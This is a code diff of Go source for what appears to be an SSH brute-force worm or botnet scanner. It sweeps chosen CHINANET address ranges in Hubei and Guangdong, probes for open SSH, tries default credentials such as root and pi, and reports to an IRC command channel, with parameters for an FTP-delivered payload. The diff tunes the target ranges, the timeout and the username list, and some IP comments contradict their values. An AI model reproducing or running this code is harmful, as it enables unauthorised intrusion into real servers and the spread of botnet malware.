@@ -16,12 +16,17 @@ var Scan_Switch bool
 
 	(1) Add your new ip range in to The set of const varible.
 		Example:
-			var_name = "224." //24.0.0.0 - 24.255.255.255
+			var_name = "224." //224.0.0.0 - 224.255.255.255
+			or
+			var_anme = "224.12" //224.12.0.0 - 224.255.255.255
 
 	(2) Go to "NextIP" function, Add The case for your ip range and return range of your ip.
 		Example:
 			case var_name:
 					return ManageIP_range(ipRange, GenRange(255, 0))
+			or
+			case var_name:
+					return ManageIP_range(ipRange, "")
 
 	(3) Then go to The "SSH_Conn" function, And add your constant ip range to The array name "NetArr".
 		Example:
@@ -35,19 +40,18 @@ var Scan_Switch bool
 
 const (
 	//CHINANET Hubei province network
-	chpn1 = "116." //116.208.0.0 - 116.211.255.255
-	chpn2 = "119." //119.96.0.0 - 119.103.255.255
-	chpn3 = "58."  //58.48.0.0 - 58.55.255.255
-	chpn4 = "221." //221.232.0.0 - 221.255.255.255
-	chpn5 = "27."  //27.16.0.0 - 27.31.255.255
+	chpn1 = "116.211" //116.211.255.255
+	chpn2 = "119."    //119.96.0.0 - 119.97.255.255
+	chpn3 = "119.102" //119.102.255.255
+	chpn4 = "58.49"   //58.49.255.255
+	chpn5 = "58.53"   //58.53.255.255
+	chpn6 = "221."    //221.234.0.0 - 221.235.255.255
 
 	//CHINANET Guangdong province network
-	cgpn1 = "113." //113.96.0.0 - 113.111.255.255
-	cgpn2 = "121." //121.8.0.0 - 121.15.255.255
-	cgpn3 = "125." //125.88.0.0 - 125.95.255.255
-	cgpn4 = "14."  //14.112.0.0 - 14.127.255.255
-	cgpn5 = "183." //183.0.0.0 - 183.63.255.255
-	cgpn6 = "124." //124.172.0.0 - 124.175.255.255
+	cgpn1 = "14.116" //114.116.255.255
+	cgpn2 = "14.118" //114.118.255.255
+	cgpn3 = "14.127" //14.127.255.255
+	cgpn4 = "121.14" //121.14.255.255
 )
 
 func GenRange(max, min int) string {
@@ -73,34 +77,32 @@ func ManageIP_range(mainRange, setRange string) string {
 func NextIP(ipRange string) string {
 	switch ipRange {
 	case chpn1:
-		return ManageIP_range(ipRange, GenRange(211, 208))
+		return ManageIP_range(ipRange, "")
 	case chpn2:
-		return ManageIP_range(ipRange, GenRange(103, 96))
+		return ManageIP_range(ipRange, GenRange(97, 96))
 	case chpn3:
-		return ManageIP_range(ipRange, GenRange(55, 48))
+		return ManageIP_range(ipRange, "")
 	case chpn4:
-		return ManageIP_range(ipRange, GenRange(235, 232))
+		return ManageIP_range(ipRange, "")
 	case chpn5:
-		return ManageIP_range(ipRange, GenRange(31, 16))
+		return ManageIP_range(ipRange, "")
+	case chpn6:
+		return ManageIP_range(ipRange, GenRange(235, 234))
 	case cgpn1:
-		return ManageIP_range(ipRange, GenRange(111, 96))
+		return ManageIP_range(ipRange, "")
 	case cgpn2:
-		return ManageIP_range(ipRange, GenRange(15, 8))
+		return ManageIP_range(ipRange, "")
 	case cgpn3:
-		return ManageIP_range(ipRange, GenRange(95, 88))
+		return ManageIP_range(ipRange, "")
 	case cgpn4:
-		return ManageIP_range(ipRange, GenRange(127, 112))
-	case cgpn5:
-		return ManageIP_range(ipRange, GenRange(63, 0))
-	case cgpn6:
-		return ManageIP_range(ipRange, GenRange(175, 172))
+		return ManageIP_range(ipRange, "")
 	}
 	return ""
 }
 
 func CheckPort(_ipRange string) string {
 	ptrIP := &_ipRange
-	conn, err := net.DialTimeout("tcp", *ptrIP, 200*time.Millisecond)
+	conn, err := net.DialTimeout("tcp", *ptrIP, 100*time.Millisecond)
 	if err != nil {
 		return ""
 	}
@@ -135,8 +137,8 @@ func SSH_Session(ssh_session *ssh.Client, command string) {
 */
 func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 	NetArr := []string{
-		chpn1, chpn2, chpn3, chpn4, chpn5, cgpn1, cgpn2, cgpn3,
-		cgpn4, cgpn5, cgpn6,
+		chpn1, chpn2, chpn3, chpn4, chpn5, chpn6,
+		cgpn1, cgpn2, cgpn3, cgpn4,
 	}
 
 	/*
@@ -144,7 +146,7 @@ func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 		You can add more if you want.
 	*/
 	userList := []string{
-		"admin", "root", "user", "guest", "support", "login", "pi",
+		"ubuntu", "root", "user", "guest", "support", "login", "pi",
 	}
 
 	passList := []string{
@@ -163,10 +165,9 @@ func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 			turnRange := CheckPort(*ptrTarget)
 
 			if turnRange == "" {
-				IRC_Report(reportIRC, set_chan, target+" SSH not found.")
 				CheckPort(target)
 			} else {
-				IRC_Report(reportIRC, set_chan, " Try to login to "+turnRange)
+				IRC_Report(reportIRC, set_chan, "Try to login to "+turnRange)
 				var logCheck bool
 
 				for i := range userList {
